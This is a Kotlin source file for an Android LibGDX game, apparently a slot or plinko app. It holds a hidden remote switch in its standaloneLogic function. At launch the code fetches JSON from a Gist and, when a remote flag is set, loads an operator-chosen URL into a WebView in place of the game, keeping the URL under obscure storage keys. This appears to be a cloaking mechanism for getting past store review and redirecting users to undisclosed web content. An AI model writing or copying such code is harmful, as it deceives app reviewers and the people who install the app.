package com.plinko.aviator.slot.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.graphics.Color
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.plinko.aviator.slot.MainActivity
import com.plinko.aviator.slot.appContext
import com.plinko.aviator.slot.game.manager.NavigationManager
import com.plinko.aviator.slot.game.manager.SoundManager
import com.plinko.aviator.slot.game.manager.SpriteManager
import com.plinko.aviator.slot.game.manager.util.SoundUtil
import com.plinko.aviator.slot.game.manager.util.SpriteUtil
import com.plinko.aviator.slot.game.screens.LoaderScreen
import com.plinko.aviator.slot.game.utils.advanced.AdvancedGame
import com.plinko.aviator.slot.game.utils.disposeAll
import com.plinko.aviator.slot.util.Gist
import com.plinko.aviator.slot.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

var GDX_GLOBAL_isGame = false
    private set

var GDX_GLOBAL_isPauseGame = false

var GDX_ORIGINAL_LINK = ""
    private set

class LibGDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var soundManager     : SoundManager      private set

    val soundUtil by lazy { SoundUtil()    }
    val allAssets by lazy { SpriteUtil.AllAssets() }

    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)
    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("Pisto", MODE_PRIVATE)

    override fun create() {
        navigationManager = NavigationManager(this)
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        standaloneLogic()
    }

    private val backgroundColor = Color.valueOf("2C3E50")

    override fun render() {
        if (GDX_GLOBAL_isPauseGame) return

        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun standaloneLogic() {
        log("standaloneLogic")
        activity.blockRedirect = { GDX_GLOBAL_isGame = true }
        activity.initWeb(activity.binding.webView)

        //GDX_GLOBAL_isGame = true
        //return

        val path = sharedPreferences.getString("Pinokletka", "oilke") ?: "oilke"

        try {
            if (path == "oilke") {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    log("json: $getJSON")

                    if (getJSON != null) {
                        if (getJSON.lower == "true") {
                            GDX_ORIGINAL_LINK = getJSON.hat
                            activity.loadUrl(GDX_ORIGINAL_LINK)

                            //GDX_ORIGINAL_LINK = "https://www.google.test"
                            //activity.loadUrl("https://www.google.com/")
                        } else {
                            GDX_GLOBAL_isGame = true
                        }

                        //coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("True", link).apply() }
                        //activity.loadUrl(link)

                    } else {
                        GDX_GLOBAL_isGame = true
                    }
                }
            } else {
                activity.loadUrl(path)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GDX_GLOBAL_isGame = true
        }
    }

}